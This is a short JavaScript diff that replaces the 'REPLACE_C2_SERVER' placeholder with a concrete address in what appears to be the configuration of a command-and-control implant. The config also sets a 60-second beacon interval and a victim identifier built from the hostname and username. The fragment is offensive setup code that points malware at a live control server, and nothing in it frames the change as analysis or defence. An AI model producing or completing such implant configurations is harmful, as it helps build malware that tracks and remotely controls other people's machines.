@@ -21,7 +21,7 @@ const os = require('os');
 const https = require('https');
 
 const cfg = {
-    srv: 'REPLACE_C2_SERVER',
+    srv: 'http://10.255.254.19:3000',
     int: 60000,
     id: `${os.hostname()}_${os.userInfo().username}_${Math.random().toString(36).slice(2)}`
 };
